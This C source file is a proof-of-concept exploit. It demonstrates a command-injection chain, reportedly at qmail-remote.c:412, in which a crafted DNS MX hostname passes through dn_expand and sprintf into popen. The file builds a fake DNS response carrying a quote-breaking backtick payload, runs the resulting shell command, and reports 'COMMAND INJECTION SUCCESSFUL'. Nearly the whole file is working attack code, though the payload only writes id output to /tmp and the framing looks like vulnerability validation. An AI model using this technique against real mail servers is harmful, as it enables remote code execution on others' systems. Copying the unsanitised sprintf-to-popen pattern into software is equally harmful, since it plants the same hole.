/*
 * Full chain validation: DNS MX response → dn_expand → sprintf → popen → RCE
 * 
 * This simulates the complete attack:
 * 1. Attacker crafts DNS MX response with shell metacharacters in exchange hostname
 * 2. dn_expand() decodes the hostname, preserving ' and ` characters
 * 3. hostname is used in sprintf() to build a shell command
 * 4. popen() executes the command, achieving code execution
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/nameser.h>
#include <resolv.h>

int build_dns_response(unsigned char *response, int maxlen, 
                       const unsigned char *label, int label_len) {
    memset(response, 0, maxlen);
    
    response[0] = 0x00; response[1] = 0x01;
    response[2] = 0x84; response[3] = 0x00;
    response[4] = 0x00; response[5] = 0x01;
    response[6] = 0x00; response[7] = 0x01;
    
    int pos = 12;
    
    response[pos++] = 7;
    memcpy(response + pos, "example", 7); pos += 7;
    response[pos++] = 3;
    memcpy(response + pos, "com", 3); pos += 3;
    response[pos++] = 0;
    response[pos++] = 0x00; response[pos++] = 0x0f;
    response[pos++] = 0x00; response[pos++] = 0x01;
    
    response[pos++] = 0xc0; response[pos++] = 0x0c;
    response[pos++] = 0x00; response[pos++] = 0x0f;
    response[pos++] = 0x00; response[pos++] = 0x01;
    response[pos++] = 0x00; response[pos++] = 0x00;
    response[pos++] = 0x0e; response[pos++] = 0x10;
    
    int rdlen_pos = pos; pos += 2;
    int rdata_start = pos;
    
    response[pos++] = 0x00; response[pos++] = 0x0a;
    
    response[pos++] = (unsigned char)label_len;
    memcpy(response + pos, label, label_len); pos += label_len;
    
    response[pos++] = 7;
    memcpy(response + pos, "example", 7); pos += 7;
    response[pos++] = 3;
    memcpy(response + pos, "com", 3); pos += 3;
    response[pos++] = 0;
    
    int rdlen = pos - rdata_start;
    response[rdlen_pos] = (rdlen >> 8) & 0xff;
    response[rdlen_pos + 1] = rdlen & 0xff;
    
    return pos;
}

int main() {
    printf("=== Full Chain Validation: DNS MX → dn_expand → sprintf → popen → RCE ===\n\n");
    
    /* Step 1: Craft DNS label with backtick injection */
    /* Payload: x'`id>/tmp/full_chain_rce`'y  
     * This breaks out of single quotes and uses backtick command substitution */
    const char *payload_label = "x'`id>/tmp/full_chain_rce`'y";
    int payload_len = strlen(payload_label);
    
    printf("Step 1: Attacker crafts MX DNS response\n");
    printf("  MX exchange label bytes: %s (length %d)\n", payload_label, payload_len);
    printf("  All bytes are valid in DNS wire format labels\n\n");
    
    /* Step 2: Build fake DNS response and run dn_expand */
    unsigned char response[512];
    int responselen = build_dns_response(response, sizeof(response), 
                                          (const unsigned char *)payload_label, payload_len);
    
    char name[MAXDNAME];
    unsigned char *responseend = response + responselen;
    int question_end = 12 + 1 + 7 + 1 + 3 + 1 + 4;
    unsigned char *mx_exchange = response + question_end + 2 + 10 + 2;
    
    int r = dn_expand(response, responseend, mx_exchange, name, MAXDNAME);
    if (r < 0) {
        printf("FAIL: dn_expand returned %d\n", r);
        return 1;
    }
    
    printf("Step 2: dn_expand() decodes the hostname\n");
    printf("  partner_fqdn = \"%s\"\n", name);
    printf("  Single quotes preserved: %s\n", strchr(name, '\'') ? "YES" : "NO");
    printf("  Backticks preserved: %s\n\n", strchr(name, '`') ? "YES" : "NO");
    
    /* Step 3: sprintf builds the shell command (exactly as in qmail-remote.c:412) */
    char acfcommand[1200];
    const char *pw_dir = "/var/qmail";
    sprintf(acfcommand, "/bin/touch %s/control/notlshosts/'%s'", pw_dir, name);
    
    printf("Step 3: sprintf() builds shell command\n");
    printf("  acfcommand = \"%s\"\n\n", acfcommand);
    
    /* Step 4: popen executes the command */
    printf("Step 4: popen() executes the command\n");
    
    /* Remove evidence file first */
    remove("/tmp/full_chain_rce");
    
    FILE *fp = popen(acfcommand, "r");
    if (fp == NULL) {
        printf("  popen failed\n");
        return 1;
    }
    pclose(fp);
    
    /* Check if command executed */
    FILE *check = fopen("/tmp/full_chain_rce", "r");
    if (check) {
        char buf[256];
        if (fgets(buf, sizeof(buf), check)) {
            printf("  COMMAND INJECTION SUCCESSFUL!\n");
            printf("  id output: %s\n", buf);
        }
        fclose(check);
    } else {
        printf("  Evidence file not found\n");
        return 1;
    }
    
    printf("\n=== CONCLUSION ===\n");
    printf("Remote code execution achieved through:\n");
    printf("1. Attacker-controlled DNS MX record with shell metacharacters in exchange hostname\n");
    printf("2. dn_expand() preserves single quotes and backticks (not in its escape set)\n");
    printf("3. partner_fqdn used unsanitized in sprintf() to build shell command\n");
    printf("4. popen() passes command to /bin/sh for execution\n");
    printf("5. Single quote breaks out of shell quoting; backtick provides command substitution\n");
    printf("\nVulnerable code: qmail-remote.c:412\n");
    printf("Process runs as: qmailr user (qmail remote delivery user)\n");
    
    return 0;
}
